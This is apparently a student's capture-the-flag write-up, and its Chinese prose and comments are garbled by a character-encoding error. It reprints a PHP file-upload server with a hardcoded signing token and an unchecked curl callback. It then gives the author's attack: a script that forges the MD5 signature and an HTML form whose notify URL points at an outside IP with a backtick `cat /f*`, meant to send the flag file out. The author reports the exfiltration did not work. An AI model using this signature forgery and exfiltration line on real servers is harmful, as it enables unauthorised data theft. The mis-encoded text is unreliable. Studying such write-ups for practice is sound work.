æœ€åä¸€é¢˜ä¹Ÿç®—æ˜¯æˆ‘è¿™æ¬¡æ ¡èµ›çš„é—æ†¾å§,ä¸€ä¸ªæ˜¯æ—¶é—´å¤ªç´§å¼ äº†,æ²¡é‚£ä¹ˆå¤šæ—¶é—´ç”¨æ¥æ‰“CTF,å¯èƒ½ä¹Ÿæ˜¯è‡ªå·±ä»£ç å®¡è®¡è¿™å—ç¡®å®low(éœ€è¦è¡¥å¼º)å¦ä¸€ä¸ªæ˜¯å‹¾å·´æœåŠ¡å™¨æœ‰ç‚¹é—®é¢˜,è¿™ä¸ªä¹Ÿä¸æ€ª,ä¹‹å‰å°±ä¸€ç›´è¿™ç§å¤–å¸¦å’Œåå¼¹shellçš„é¢˜è§çš„å°‘,æ¯æ¬¡éƒ½è§‰å¾—ç•™åœ¨åé¢å†™,åé¢å‘ç°é‡åˆ°çš„ä¹Ÿå¤šäº†,å†æ…¢æ…¢å­¦å§

æºç å…ˆè®°å½•ä¸‹;

```php
<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, Authorization");
header('Access-Control-Allow-Methods: GET, POST, PUT,DELETE,OPTIONS,PATCH');

class Server{

    const DS = '/';

    protected $config = [];

    protected $runtime_path;

    /**
     * åˆå§‹åŒ–
     * @param array $config
     */
    public function __construct(array $config = [])
    {
        // é»˜è®¤é…ç½®
        $default = [
            'token' => '',
            'chunks_path' => '/chunks/',
            'upload_path' => '/upload/',
            'min_file_size' => 2 * 1024 * 1024
        ];
        // è·å–é…ç½®ä¿¡æ¯
        $this->config = array_merge($default,$config);

        // è¿è¡Œç›®å½•
        $this->runtime_path = $this->getFitSeparator(__DIR__);

    }


    /**
     * æ„å»ºå™¨
     * @param $config
     */
    public static function create($config){
        try {
            (new self($config))->start();
        }catch (Throwable $e){
            if($e->getCode() == 077)
                exit($e->getMessage());
            exit(json_encode(['code' => 0,'msg' => $e->getMessage()]));
        }
    }

    /**
     * è¿è¡Œè¿œç¨‹æœåŠ¡å™¨
     * @throws Exception
     */
    public function start(){
        // ç­¾å
        $sign = $_GET['sign'] ?? '';

        if(empty($sign)){
            $this->returnJson(0,'æ•°æ®ç­¾åä¸å­˜åœ¨');
        }

        if(!$this->sign_verify($_GET,$sign)){
            $this->returnJson(0,'æ•°æ®ç­¾åéªŒè¯å¤±è´¥');
        }
                // ä¸Šä¼ æ–‡ä»¶
                $info = $this->upload_file($_GET['uid']);
                // é¢å¤–å‚æ•°
                $info['uid'] = $_GET['uid'];
                // å›è°ƒé€šçŸ¥
                $res = $this->upload_notify($_GET['notify'],$info);
                $this->returnJson(1,'ä¸Šä¼ æ–‡ä»¶æˆåŠŸ');
    }


    /**
     * ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨
     * @param $uid
     * @return array
     * @throws Exception
     */
    protected function upload_file($uid): array
    {
        // è·å–ä¸Šä¼ æ–‡ä»¶
        $file = $_FILES["file"];

        if(!$file){
            $this->returnJson(0,'è¯·é€‰æ‹©éœ€è¦ä¸Šä¼ çš„æ–‡ä»¶');
        }


        // æ–‡ä»¶åç¼€
        $file_ext = strtolower(pathinfo($file['name'],PATHINFO_EXTENSION));

        // è·å–ä¿å­˜ç›®å½•
        $save_dir = $this->getUserUploadPath($uid);

        // è·å–ä¿å­˜æ–‡ä»¶å¤¹
        $file_name = 'file_'.$this->getRandomName(16);

        // æœ€ç»ˆä¿å­˜è·¯å¾„
        $save_file = $this->runtime_path . $save_dir . $file_name .'.'. $file_ext;

        // ä¿å­˜æ–‡ä»¶
        move_uploaded_file($file["tmp_name"], $save_file);


        if(!is_file($save_file)){
            $this->returnJson(0,'æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼šError Move Files');
        }

        $size = filesize($save_file);

        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime_type = finfo_file($finfo,$save_file);

        // æ–‡ä»¶ä¿¡æ¯
        return [
            'name' => $file['name'],
            'ext' => $file_ext,
            'path' => $save_dir . $file_name .'.'. $file_ext,
            'size' => $size,
            'mime' => $mime_type
        ];

    }


    /**
     * è·å–ç”¨æˆ·ä¸Šä¼ ç›®å½•
     * @param $uid
     * @return array|string|string[]
     */
    protected function getUserUploadPath($uid){
        $root = $this->runtime_path;
        $path = $this->getFitSeparator($this->config['upload_path'] . date('Ymd') . self::DS . $uid . self::DS);

        $save_path = $this->getFitSeparator($root.$path);

        is_dir($save_path) || mkdir($save_path,0775,true);

        return $path;
    }

    /**
     * è·å–éšæœºæ–‡ä»¶å
     * @param int $length
     * @return string
     */
    protected function getRandomName(int $length = 16): string
    {
        $charTable = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        $result = "";
        for ( $i = 0; $i < $length; $i++ ){
            $result .= $charTable[ mt_rand(0, strlen($charTable) - 1) ];
        }
        return $result;
    }

    /**
     * è·å–ä¸€è‡´åŒ–ç›®å½•åˆ†éš”ç¬¦
     * @param $dir
     * @param string $ds
     * @return array|string|string[]
     */
    protected function getFitSeparator($dir, string $ds = ''){
        $ds = empty($ds) ? self::DS : $ds;
        return str_replace(['\\','/','\\\\','//'],$ds,$dir);
    }


    /**
     * è¿”å›jsonå†…å®¹
     * @param $code
     * @param $msg
     * @param $data
     * @return void
     * @throws Exception
     */
    protected function returnJson($code, $msg, $data = null){
        $result = [
            'code' => $code,
            'msg' => $msg
        ];

        if(is_array($data)){
            $result = array_merge($result,$data);
        }else if (is_string($data)){
            $result['data'] = $data;
        }

        $json = json_encode($result);

        throw new Exception($json,077);
    }

    /**
     * å‚æ•°ç­¾å
     * @param $params
     * @return string
     */
    protected function sign_params($params): string
    {
        // è¿‡æ»¤å‚æ•°
        $params = array_filter($params,function($key) use ($params){
            if(empty($params[$key]) || $key == 'sign'){
                return false;
            }
            return true;
        },ARRAY_FILTER_USE_KEY);

        // asciiæ’åº
        ksort($params);
        reset($params);

        // ç­¾å
        return md5(urldecode(http_build_query($params)) . $this->config['token']);
    }

    /**
     * ç­¾åéªŒè¯
     * @param $params
     * @param $sign
     * @return bool
     */
    protected function sign_verify($params,$sign): bool
    {
        return $this->sign_params($params) == $sign;
    }

    /**
     * å›è°ƒé€šçŸ¥ä¸Šä¼ 
     * @param $url
     * @param $param
     * @return bool|string
     */
    protected function upload_notify($url,$param)
    {
        // ç”Ÿæˆç­¾å
        $sign = $this->sign_params($param);
        $param['sign'] = $sign;

        // è¯·æ±‚åœ°å€
        $request_url = $url.'?'.urldecode(http_build_query($param));

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $request_url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
        //åˆ©ç”¨ç‚¹!
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }

}

Server::create(['token' => 'QiuQIuYyds', 'upload_path' => '/upload/']);
```

æˆ‘è§‰å¾—åº”è¯¥å°±æ˜¯ssrfæ¼æ´ç»“åˆ`curl_exec`å¤–å¸¦,ä½†æ˜¯ä¸€ç›´æ²¡å¤–å¸¦æˆåŠŸ,å¯èƒ½æ˜¯æˆ‘åˆ†æçš„åœ°æ–¹æœ‰é—®é¢˜

Maybeå¤–å¸¦çš„æ€è·¯ä¹Ÿä¸å¯¹?

ä¸ºäº†ä¼ªé€ è¿™ä¸ªè¯·æ±‚,é¦–å…ˆè¦ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶,ç„¶åæœåŠ¡å™¨å¯¹ç­¾åè¿›è¡Œæ ¡éªŒ,æ ¡éªŒç­¾åçš„æœºåˆ¶éƒ½å†™åœ¨ä»£ç ç»™ä½ äº†,åˆ†æä¸€ä¸‹ä¸éš¾å‘ç°å°±æ˜¯æŠŠä¼ å…¥çš„å‚æ•°è¿›è¡Œæ’åºæ‹¼æ¥å†åŠ ä¸ª`token`æ‹¼æ¥èµ·æ¥`md5`    hashä¸€ä¸‹.

ä¼ªé€ ç­¾åè„šæœ¬

```php
?<?php
function sign_params($params): string
    {   
        $token = 'QiuQIuYyds';
        // è¿‡æ»¤å‚æ•°
        $params = array_filter($params,function($key) use ($params){
            if(empty($params[$key]) || $key == 'sign'){
                return false;
            }
            return true;
        },ARRAY_FILTER_USE_KEY);

        // asciiæ’åº
        ksort($params);
        reset($params);

        // ç­¾å
        return md5(urldecode(http_build_query($params)) . $token);//ç»•è¿‡!
}
$params = [
    'uid' => 'index.php', // æ›¿æ¢ä¸ºç›®æ ‡ç”¨æˆ·çš„å®é™… ID
    'notify' => 'http://47.236.170.130:8081/`cat /f*`', // ä¼ªé€ çš„é€šçŸ¥ URL
    // 'file' => 'file:///flag' // ä¼ªé€ çš„æ–‡ä»¶è·¯å¾„
];

$notify='http://47.236.170.130:8081/`cat /f*`';
function upload_notify($url,$param)
    {
        // ç”Ÿæˆç­¾å
        //74$res = $this->upload_notify($_GET['notify'],$info);//åœ¨è¿™æ‰§è¡Œ
        $sign = sign_params($param);//è§‚å¯Ÿä¼ å‚è¡Œä¸º!
        $param['sign'] = $sign;

        // è¯·æ±‚åœ°å€
        $request_url = $url.'?'.urldecode(http_build_query($param));
        echo $request_url;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $request_url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);

        $result = curl_exec($ch);//ssrf
        curl_close($ch);
        echo $result;
        return $result;
    }
// $token = 'QiuQIuYyds'; // å·²çŸ¥çš„ token
// $signature = md5(urldecode(http_build_query($params)) . $token);
// echo sign_params(params: $params);
upload_notify($notify,$params);
// http://121.41.53.189:36446/?uid=aa&notify=file:///flag&sign=fcfd46d234326f64bd3f9b6f97cf3748&file=file:///flag
```

ä¼ªé€ è¯·æ±‚å‘åŒ…è¡¨å•:

```html
<!DOCTYPE html>
<html>
<head>
    <title>æ–‡ä»¶ä¸Šä¼ è¡¨å•</title>
</head>
<body>

<form action="http://121.41.53.189:36739/?uid=index.php&notify=http://47.236.170.130:8081/`cat /f*`&sign=c03ddc84442095751b4122a5652dbf8c" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="ä¸Šä¼ æ–‡ä»¶">
</form>

</body>
</html>
```

åˆ†æåˆ°è¿™å„¿äº†,å†™ä½œä¸šå»äº†(è¿˜æœ‰ä¸€å †å®éªŒæŠ¥å‘Š)    ~æ‚²~

OK,è¿™æ¬¡CTFæ ¡èµ›åˆèµ›å°±åˆ°è¿™äº†ba.

æ­£å¸¸å‘æŒ¥åªèƒ½ç®—æ˜¯~

è¿˜è¦ç»§ç»­åŠ æ²¹!
